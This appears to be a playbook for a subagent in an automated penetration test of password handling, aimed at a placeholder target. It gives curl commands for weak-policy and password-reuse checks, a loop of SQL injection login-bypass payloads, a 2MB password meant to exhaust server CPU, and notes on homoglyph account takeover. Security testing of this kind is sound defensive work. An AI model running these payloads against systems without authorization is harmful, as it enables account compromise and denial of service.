# Subagent 01: Password Policies, Encodings & Input Flaws

## Role & Mission
Responsible for evaluating password policy enforcement, boundary limitations (truncation, maximum length DoS), Unicode normalization flaws, old password verification during changes, and injection vulnerabilities in the password parameter.

## Assigned Checklist Tasks (8 Checks)
- **Check 01:** Weak password policies (minimum length, complexity rules)
- **Check 07:** Old password verification requirement when changing password
- **Check 08:** Password reuse policy enforcement
- **Check 14:** Password truncation vulnerabilities (e.g. bcrypt 72-byte truncation)
- **Check 15:** Unicode normalization issues in password handling (NFKC/NFD homoglyphs)
- **Check 16:** SQL injection vulnerabilities in the password input parameter
- **Check 33:** Password complexity bypass via special encoding or null bytes (`%00`)
- **Check 34:** Password maximum length Denial of Service (CPU exhaustion from heavy hashing)

---

## Standardized Execution Playbook

### Step 1: Password Strength & Complexity Boundary Testing (Check 01)
Test if backend validates password strength rules or allows trivial passwords:

```bash
# Test payloads:
# 1. 1-character password: "a"
# 2. All spaces: "      "
# 3. All digits: "123456"
# 4. Common word without complexity: "password"
curl -s -X POST "https://<target>/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com", "password":"a"}' > artifacts/policy_response.json
```

### Step 2: Old Password Requirement & Reuse Policies (Checks 07, 08)
```bash
# 1. Test Password Change without Current Password (Check 07)
# Send change password request omitting "old_password" or "current_password"
curl -s -X POST "https://<target>/api/user/change-password" \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"new_password":"NewP@ssword123!"}' > artifacts/change_password_response.json

# 2. Test Password Reuse Policy (Check 08)
# Attempt updating password to the exact current password
curl -s -X POST "https://<target>/api/user/change-password" \
  -H "Authorization: Bearer $SESSION_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"current_password":"CurrentPassword123!", "new_password":"CurrentPassword123!"}'
```

### Step 3: Password Truncation Attacks (Check 14)
*Vulnerability Identification:* Standard `bcrypt` algorithms only hash the first 72 bytes of a password and ignore any subsequent characters. If an application truncates passwords, `Password123!` + 100 characters will authenticate as `Password123!`.

```bash
# 1. Set password to a 100-character string
BASE="MyVerySecurePasswordLongEnoughToReachOver72BytesAndTriggerBcryptTruncationBug1234"
# 2. Attempt login using only the first 72 characters
# If login succeeds, the application suffers from bcrypt truncation
```

### Step 4: Unicode Normalization Issues (Check 15)
Applications that normalize Unicode (e.g. converting `Kelvin sign (\u212A)` to `K`, or `ligature \uFB01` to `fi`) may allow account takeover or password bypass:

```bash
# Register account with normal characters vs Unicode homoglyph:
# Example: 'admin' vs 'аdmin' (Cyrillic \u0430)
# Check if Unicode normalization collapses different characters into the same hash
```

### Step 5: SQL Injection in Password Field (Check 16)
Some legacy authentication queries concatenate parameters (`SELECT * FROM users WHERE user='$u' AND pass='$p'`):

```bash
SQLI_PASSWORDS=(
  "' OR '1'='1"
  "' OR '1'='1' --"
  "' OR ''='"
  "admin'--"
  "' OR 1=1#"
)

for p in "${SQLI_PASSWORDS[@]}"; do
  curl -s -X POST "https://<target>/api/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\", \"password\":\"${p}\"}"
done
```

### Step 6: Maximum Length DoS via Password Hashing (Check 34)
CPU-intensive hashing algorithms (Argon2, PBKDF2 with high iterations, bcrypt) consume significant server memory and compute when hashing enormous inputs:

```bash
# Generate a 2MB password string
python3 -c "print('A' * 2000000)" > massive_password.txt

# Measure server response time to evaluate CPU exhaustion
curl -s -w "Time: %{time_total}s, HTTP: %{http_code}\n" -o /dev/null -X POST "https://<target>/api/auth/login" \
  -H "Content-Type: application/json" \
  --data-binary "{\"username\":\"testuser\", \"password\":\"$(cat massive_password.txt)\"}"
```

---

## Output Artifact
Aggregate findings into:
`artifacts/subagent_01_password_policies.md`
